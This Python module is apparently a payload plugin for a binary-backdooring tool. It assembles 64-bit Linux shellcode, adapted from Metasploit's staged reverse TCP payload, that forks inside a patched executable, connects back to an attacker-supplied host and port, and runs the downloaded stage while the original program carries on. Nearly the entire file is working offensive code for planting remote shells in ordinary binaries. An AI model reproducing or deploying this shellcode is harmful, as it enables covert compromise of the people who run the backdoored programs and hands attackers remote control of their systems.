import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class fork_reverse_shell_tcp_staged():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "fork_reverse_shell_tcp_staged"
        self.description = """Staged payload reverse tcp payload from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self): #flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified from metasploit payload/linux/x64/shell/reverse_tcp
        to correctly fork the shellcode payload and continue normal execution.
        """

        #64bit shellcode
        self.shellcode = b"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0f"
        self.shellcode += b"\xe8\x00\x00\x00\x00" # call $5
        self.shellcode += b"\x5D"  # pop rbp
        self.shellcode += b"\x48\x81\xED"  # sub rbp value below
        self.shellcode += struct.pack("<I", self.PM.BDF.elf_object['distance_to_payload']+len(self.shellcode)-4)
        self.shellcode += b"\xff\xe5" # jmp rbp
        self.shellcode += bytes("\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
                            "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
                            "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00", 'iso-8859-1')
        self.shellcode += struct.pack("!H", int(self.PORT))
        self.shellcode += common.pack_ip_addresses(self.HOST)
        self.shellcode += bytes("\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
                            "\x05\x59\x5e\x5a\x0f\x05\xff\xe6", 'iso-8859-1')

        return self.shellcode

        
